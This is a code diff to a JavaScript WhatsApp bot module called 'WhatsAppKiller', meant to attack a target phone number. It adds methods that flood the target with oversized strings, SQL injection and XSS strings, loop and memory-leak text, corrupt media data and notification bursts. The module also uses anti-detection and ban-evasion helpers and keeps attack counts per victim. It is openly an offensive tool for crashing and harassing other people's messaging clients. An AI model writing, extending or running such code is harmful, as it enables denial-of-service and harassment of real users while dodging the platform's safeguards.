@@ -1,8 +1,8 @@
 'use strict';
 
 const crypto = require('crypto');
-const AntiDetection = require('../lib/antiDetection');
-const BanProtection = require('../lib/banProtection');
+const AntiDetection = require('./antiDetection');
+const BanProtection = require('./banProtection');
 
 class WhatsAppKiller {
     constructor() {
@@ -11,6 +11,8 @@ class WhatsAppKiller {
         this.banProtection = new BanProtection();
         this.activeAttacks = new Map();
         this.attackStats = new Map();
+
+        // All crash vectors – methods are defined below
         this.crashVectors = [
             this.sendMalformedMessage.bind(this),
             this.sendOverflowPayload.bind(this),
@@ -23,6 +25,8 @@ class WhatsAppKiller {
             this.sendMemoryLeakPayload.bind(this),
             this.sendNotificationBomb.bind(this)
         ];
+
+        // All bug payloads – methods defined below
         this.bugPayloads = [
             this.sendDatabaseCorruptor.bind(this),
             this.sendCacheCorruptor.bind(this),
@@ -42,6 +46,9 @@ class WhatsAppKiller {
         ];
     }
 
+    // ============================================
+    // MAIN EXECUTE
+    // ============================================
     async execute(sock, msg, args, ctx) {
         this.sock = sock;
         if (args.length < 1) {
@@ -178,6 +185,9 @@ class WhatsAppKiller {
         return await this.injectAllBugs(phone, duration);
     }
 
+    // ============================================
+    // SEND MESSAGE WITH STEALTH
+    // ============================================
     async sendWhatsAppMessage(phone, message) {
         try {
             if (this.stealth.getBanRisk(phone) >= 5) return false;
@@ -201,6 +211,9 @@ class WhatsAppKiller {
         }
     }
 
+    // ============================================
+    // ALL BUG PAYLOADS
+    // ============================================
     async injectAllBugs(phone, duration) {
         let successCount = 0, totalAttempts = 0;
         const startTime = Date.now();
@@ -402,23 +415,116 @@ class WhatsAppKiller {
         } catch (e) { return false; }
     }
 
+    // ============================================
+    // CRASH VECTORS (old methods kept for compatibility)
+    // ============================================
+    async sendMalformedMessage(phone) {
+        try {
+            const malformedData = 'A'.repeat(50000) + crypto.randomBytes(500).toString('hex');
+            return await this.sendWhatsAppMessage(phone, malformedData);
+        } catch (e) { return false; }
+    }
+
+    async sendOverflowPayload(phone) {
+        try {
+            const overflow = 'X'.repeat(250000);
+            return await this.sendWhatsAppMessage(phone, overflow);
+        } catch (e) { return false; }
+    }
+
+    async sendCorruptMedia(phone) {
+        try {
+            const corruptData = Buffer.from([0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF]).toString('base64');
+            return await this.sendWhatsAppMessage(phone, '📷 ' + corruptData.substring(0, 500));
+        } catch (e) { return false; }
+    }
+
+    async sendInvalidLink(phone) {
+        try {
+            const link = 'whatsapp://' + 'a'.repeat(25000);
+            return await this.sendWhatsAppMessage(phone, link);
+        } catch (e) { return false; }
+    }
+
+    async sendSQLInjection(phone) {
+        try {
+            const sql = "' OR '1'='1' -- " + 'A'.repeat(2500);
+            return await this.sendWhatsAppMessage(phone, sql);
+        } catch (e) { return false; }
+    }
+
+    async sendXSSPayload(phone) {
+        try {
+            const xss = '<script>alert(1)</script>' + 'A'.repeat(2500);
+            return await this.sendWhatsAppMessage(phone, xss);
+        } catch (e) { return false; }
+    }
+
+    async sendInfiniteLoopPayload(phone) {
+        try {
+            const payload = 'while(true){' + 'A'.repeat(5000) + '}';
+            return await this.sendWhatsAppMessage(phone, payload);
+        } catch (e) { return false; }
+    }
+
+    async sendRecursionPayload(phone) {
+        try {
+            const payload = 'function x(){x();}' + 'A'.repeat(5000);
+            return await this.sendWhatsAppMessage(phone, payload);
+        } catch (e) { return false; }
+    }
+
+    async sendMemoryLeakPayload(phone) {
+        try {
+            const payload = 'var leak=[];while(true){leak.push("A".repeat(5000))}' + 'A'.repeat(5000);
+            return await this.sendWhatsAppMessage(phone, payload);
+        } catch (e) { return false; }
+    }
+
+    async sendNotificationBomb(phone) {
+        try {
+            const messages = [];
+            for (let i = 0; i < 5; i++) {
+                messages.push(`🔔 Notification ${i+1} - ${crypto.randomBytes(4).toString('hex')}`);
+            }
+            const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
+                delayBetween: this.stealth.getNaturalDelay('message'),
+                randomSpread: true,
+                maxPerBatch: 5
+            });
+            return results.some(r => r.success);
+        } catch (e) { return false; }
+    }
+
+    // ============================================
+    // STATS TRACKING
+    // ============================================
     trackAttack(phone, type) {
-        if (!this.attackStats.has(phone)) this.attackStats.set(phone, { killwa: 0, lastAttack: null });
+        if (!this.attackStats.has(phone)) {
+            this.attackStats.set(phone, { killwa: 0, lastAttack: null });
+        }
         const stats = this.attackStats.get(phone);
         stats[type] = (stats[type] || 0) + 1;
         stats.lastAttack = Date.now();
         this.attackStats.set(phone, stats);
-        if (stats.killwa > 10) this.banProtection.addToBlacklist(phone, 'Too many killwa attacks');
+        if (stats.killwa > 10) {
+            this.banProtection.addToBlacklist(phone, 'Too many killwa attacks');
+        }
     }
 
     updateAttackStats(phone, type, count) {
-        if (!this.attackStats.has(phone)) this.trackAttack(phone, type);
+        if (!this.attackStats.has(phone)) {
+            this.trackAttack(phone, type);
+        }
         const stats = this.attackStats.get(phone);
         stats[type] = (stats[type] || 0) + count;
         this.attackStats.set(phone, stats);
     }
 }
 
+// ============================================
+// STOP COMMAND
+// ============================================
 class WhatsAppKillerStop {
     constructor(killer) {
         this.killer = killer;
